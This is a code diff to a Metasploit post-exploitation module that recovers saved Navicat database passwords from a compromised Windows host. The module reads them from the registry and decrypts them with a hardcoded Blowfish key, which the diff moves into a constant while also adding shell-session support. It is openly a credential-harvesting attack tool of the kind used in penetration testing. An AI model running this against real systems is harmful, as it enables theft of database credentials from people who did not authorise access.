@@ -9,7 +9,8 @@
 class MetasploitModule < Msf::Post
   include Msf::Post::Windows::Registry
   include Msf::Post::File
-
+  # secret_key = Digest::SHA1.digest('3DC5CA39')
+  SECRET_KEY = "B\xCE\xB2q\xA5\xE4X\xB7J\xEA\x93\x94y\"5C\x91\x873@".freeze
   def initialize(info = {})
     super(
       update_info(
@@ -26,7 +27,7 @@ class MetasploitModule < Msf::Post
           'Kali-Team <kali-team[at]qq.com>' # MSF module
         ],
         'Platform' => [ 'win' ],
-        'SessionTypes' => [ 'meterpreter' ],
+        'SessionTypes' => [ 'meterpreter', 'shell'],
         'Notes' => {
           'Stability' => [],
           'Reliability' => [],
@@ -42,20 +43,18 @@ class MetasploitModule < Msf::Post
   end
 
   def blowfish_encrypt(data = "\xFF" * 8)
-    secret_key = Digest::SHA1.digest('3DC5CA39')
     cipher = OpenSSL::Cipher.new('bf-ecb').encrypt
     cipher.padding = 0
-    cipher.key_len = secret_key.length
-    cipher.key = secret_key
+    cipher.key_len = SECRET_KEY.length
+    cipher.key = SECRET_KEY
     cipher.update(data) << cipher.final
   end
 
   def blowfish_decrypt(text)
-    secret_key = Digest::SHA1.digest('3DC5CA39')
     cipher = OpenSSL::Cipher.new('bf-cbc').decrypt
     cipher.padding = 0
-    cipher.key_len = secret_key.length
-    cipher.key = secret_key
+    cipher.key_len = SECRET_KEY.length
+    cipher.key = SECRET_KEY
     cipher.iv = "\x00" * 8
     cipher.update(text) + cipher.final
   end
@@ -73,7 +72,6 @@ class MetasploitModule < Msf::Post
     cv = iv
     full_round, left_length = ciphertext.length.divmod(8)
 
-    password = ''
     if full_round > 0
       for i in 0..full_round - 1 do
         t = blowfish_decrypt(ciphertext[i * 8, 8])
@@ -103,7 +101,7 @@ class MetasploitModule < Msf::Post
   end
 
   def navicat_store_config(config)
-    if config[:hostname].to_s.empty? || config[:service_name].to_s.empty? || config[:port].to_s.empty? || config[:username].to_s.empty? || config[:password].nil?
+    if [:hostname, :service_name, :port, :username].any? { |e| config[e].blank? } || config[:password].nil?
       return # If any of these fields are nil or are empty (with the exception of the password field which can be empty),
       # then we shouldn't proceed, as we don't have enough info to store a credential which someone could actually
       # use against a target.
@@ -170,10 +168,11 @@ class MetasploitModule < Msf::Post
 
       subkeys.each do |subkey|
         enc_pwd_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'Pwd')
+        next if enc_pwd_value.nil?
+
         username_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'UserName')
         port_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'Port')
         host_value = registry_getvaldata("#{reg_key}\\#{subkey}", 'Host')
-        next if enc_pwd_value.nil?
 
         pwd_value = decrypt_navicat11(enc_pwd_value)
         result << {
@@ -209,7 +208,7 @@ class MetasploitModule < Msf::Post
         name: item[:name],
         hostname: item[:hostname],
         service_name: item[:protocol],
-        port: item[:port].nil? ? '' : item[:port].to_i,
+        port: item[:port].nil? ? '' : item[:port],
         username: item[:username],
         password: item[:password]
       }
@@ -223,7 +222,7 @@ class MetasploitModule < Msf::Post
   end
 
   def run
-    print_status("Gathering Navicat password information from #{sysinfo['Computer']}")
+    print_status('Gathering Navicat password information.')
     if datastore['NCX_PATH']
       ncx_path = datastore['NCX_PATH']
       print_status("Looking for #{ncx_path}")
